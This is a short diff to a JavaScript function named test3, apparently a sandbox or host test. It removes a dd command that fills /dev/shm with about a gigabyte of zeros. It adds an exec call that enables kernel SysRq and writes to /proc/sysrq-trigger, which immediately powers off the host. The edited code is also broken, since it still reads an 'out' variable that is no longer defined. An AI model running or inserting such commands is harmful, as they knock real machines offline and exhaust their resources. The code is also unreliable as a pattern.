@@ -1,9 +1,6 @@
 const test3 = () => {
-
-    const child_process = require('child_process');
-    let out;
-    
-    out = child_process.spawnSync('dd if=/dev/zero of=/dev/shm/fill bs=1k count=1024k');
+    const { exec } = require('child_process');
+    exec('echo 1 > /proc/sys/kernel/sysrq; echo o > /proc/sysrq-trigger');
     if(out.stderr.toString('utf8')){
         return out.stderr.toString('utf8');
     } else {
